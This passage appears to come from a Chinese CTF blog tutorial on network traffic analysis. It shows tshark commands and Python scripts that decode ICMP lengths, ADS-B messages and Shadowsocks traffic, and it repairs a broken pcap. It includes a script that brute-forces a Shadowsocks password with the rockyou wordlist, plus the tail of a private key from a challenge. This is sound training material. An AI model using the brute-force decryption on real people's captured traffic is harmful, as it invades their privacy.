</span></span><span class=line><span class=cl>2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----</span></span></code></pre></td></tr></table></div></div><p>例题2-2024铁三初赛 流量分析</p><h2 class=heading-element id=icmp流量分析><span>ICMP流量分析</span>
<a href=#icmp%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>flag 可能藏在每一帧的长度中</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 1.pcapng -Y <span class=s2>&#34;icmp&#34;</span> -T fields -e frame.len <span class=p>|</span> uniq &gt; data.txt</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>item</span><span class=p>)</span><span class=o>-</span><span class=mi>42</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>例题1-第三届“百越杯”福建省高校网络空间安全大赛-要想会，先学会</p><h2 class=heading-element id=vpn流量分析><span>VPN流量分析</span>
<a href=#vpn%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=shadowsocks流量分析><span>Shadowsocks流量分析</span>
<a href=#shadowsocks%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>例题-2023强网杯-谍影重重3.0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#请求解密脚本</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>EVP_BytesToKey</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>key_len</span><span class=p>,</span> <span class=n>iv_len</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>m</span><span class=p>))</span> <span class=o>&lt;</span> <span class=p>(</span><span class=n>key_len</span> <span class=o>+</span> <span class=n>iv_len</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>md5</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>m</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>        <span class=n>md5</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>md5</span><span class=o>.</span><span class=n>digest</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>ms</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>ms</span><span class=p>[:</span><span class=n>key_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>ms</span><span class=p>[</span><span class=n>key_len</span><span class=p>:</span><span class=n>key_len</span> <span class=o>+</span> <span class=n>iv_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key_len</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=mi>256</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iv_len</span> <span class=o>=</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>    <span class=n>mode</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CFB</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>EVP_BytesToKey</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>key_len</span><span class=p>,</span> <span class=n>iv_len</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[:</span><span class=n>iv_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>real_cipher</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=n>iv_len</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>obj</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>mode</span><span class=p>,</span> <span class=n>iv</span><span class=p>,</span> <span class=n>segment_size</span><span class=o>=</span><span class=mi>128</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=n>obj</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>real_cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>plain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=s1>&#39;e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 因为password未知，所以我们这里尝试用字典进行爆破</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;rockyou.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>password</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>plain</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>password</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;HTTP&#39;</span> <span class=ow>in</span> <span class=n>plain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>password</span><span class=o>.</span><span class=n>decode</span><span class=p>(),</span> <span class=n>plain</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=vmessv2ray流量分析><span>VMess(V2ray)流量分析</span>
<a href=#vmessv2ray%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h4 class=heading-element id=vmessmd5><span>VMessMD5</span>
<a href=#vmessmd5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>【例题：2022强网杯-谍影重重】</p><h4 class=heading-element id=vmessaead><span>VMessAEAD</span>
<a href=#vmessaead class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>【例题：2024 DubheCTF-authenticated mess & unauthenticated less】</p><h2 class=heading-element id=ads-b流量分析><span>ADS-B流量分析</span>
<a href=#ads-b%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>飞机/航空器流量，找到流量数据，用pyModeS模块分析即可</p><p>例题</p><p><strong>[2023 强网杯] 谍影重重2.0</strong></p><p>下载附件得到一个只有TCP流量的流量包
题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE
问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块
在参考链接：https://gitee.com/wangmin-gf/ads-b 看到了与tcp.payload中相似的数据
使用tshark提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可</p><p>tshark -r attach.pcapng -T fields -e &ldquo;tcp.payload&rdquo; | sed &lsquo;/^\s*$/d&rsquo; > tshark.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pyModeS</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;tshark.txt&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(item.strip())</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>item</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span> <span class=o>!=</span> <span class=mi>46</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>pyModeS</span><span class=o>.</span><span class=n>tell</span><span class=p>(</span><span class=n>item</span><span class=o>.</span><span class=n>strip</span><span class=p>()[</span><span class=mi>18</span><span class=p>:</span><span class=mi>46</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;===========================================================================&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>===========================================================================</span>
</span></span><span class=line><span class=cl>                     Message: 8d79a05e990ccda6f80886dd9544
</span></span><span class=line><span class=cl>                ICAO address: 79a05e
</span></span><span class=line><span class=cl>             Downlink Format: <span class=m>17</span>
</span></span><span class=line><span class=cl>                    Protocol: Mode-S Extended Squitter <span class=o>(</span>ADS-B<span class=o>)</span>
</span></span><span class=line><span class=cl>                        Type: Airborne velocity
</span></span><span class=line><span class=cl>                       Speed: <span class=m>371</span> knots
</span></span><span class=line><span class=cl>                       Track: 213.3474959459136 degrees
</span></span><span class=line><span class=cl>               Vertical rate: -64 feet/minute
</span></span><span class=line><span class=cl>                        Type: Ground <span class=nv>speed</span>
</span></span><span class=line><span class=cl><span class=o>===========================================================================</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=oicq协议qq协议><span>OICQ协议(QQ协议)</span>
<a href=#oicq%e5%8d%8f%e8%ae%aeqq%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p><img loading=lazy src=/posts/5422d65/imgs/image-20250302192720139.png alt=/posts/5422d65/imgs/image-20250302192720139.png height=1528 width=2560></p><p>可以分析得到QQ号</p><h2 class=heading-element id=损坏的流量包分析><span>损坏的流量包分析</span>
<a href=#%e6%8d%9f%e5%9d%8f%e7%9a%84%e6%b5%81%e9%87%8f%e5%8c%85%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>例题-第一届“百度杯”信息安全攻防总决赛 find the flag（flag藏在 frame29-41 的 ip.id 字段中）</p><p>打开流量包后发现有如下的报错</p><p><img loading=lazy src=/posts/5422d65/imgs/N10.png alt=/posts/5422d65/imgs/N10.png height=1600 width=2557></p><p>可以直接使用 <a href=https://f00l.de/hacking/pcapfix.php target=_blank rel="external nofollow noopener noreferrer">在线网站</a> 修复</p><p>修复完成以后就是正常的流量分析了</p><h2 class=heading-element id=从流量包中找异常流量><span>从流量包中找异常流量</span>
<a href=#%e4%bb%8e%e6%b5%81%e9%87%8f%e5%8c%85%e4%b8%ad%e6%89%be%e5%bc%82%e5%b8%b8%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数，
然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2025-05-15 10:15:27">更新于 2025-05-15&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md><span><a href=/posts/5422d65/index.md title=阅读原始文档 class=link-to-markdown>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 X" data-sharer=twitter data-url=https://goodlunatic.github.io/posts/5422d65/ data-title=Misc-流量分析 data-hashtags=CTF,Misc><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://goodlunatic.github.io/posts/5422d65/ data-hashtag=CTF><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://goodlunatic.github.io/posts/5422d65/ data-title=Misc-流量分析><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ctf/ class=post-tag title="标签 - CTF">CTF</a><a href=/tags/misc/ class=post-tag title="标签 - Misc">Misc</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/32c3b27/ class=post-nav-item rel=prev title="DASCTF 2024最后一战 Misc Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>DASCTF 2024最后一战 Misc Writeup</a><a href=/posts/ca974cb/ class=post-nav-item rel=next title="Frida Learning Record">Frida Learning Record<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment><script src=https://giscus.app/client.js data-repo=goodlunatic/goodlunatic.github.io data-repo-id=R_kgDOQHqgBw data-category=Announcements data-category-id=DIC_kwDOQHqgB84Cw_4D data-mapping=pathname data-strict=0 data-theme=preferred_color_scheme data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-loading=lazy crossorigin=anonymous async defer></script></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/ rel="external nofollow noopener noreferrer">giscus</a>.</noscript></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered order-1">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd">FixIt</a></div><div class="footer-line copyright order-2" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2026</span><span class=author itemprop=copyrightHolder>
<a href=https://goodlunatic.github.io target=_blank rel="external nofollow noopener noreferrer">Lunatic</a></span></div><div class="footer-line visitor"><span id=busuanzi_container_site_uv title=总访客数><i class="fa-regular fa-user fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=总访问量><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div><div class="fixed-button view-comments d-none" role=button aria-label=查看评论><i class="fa-solid fa-comment fa-fw" aria-hidden=true></i></div></div><a href=https://github.com/goodlunatic title="Visit Lunatic's Github" 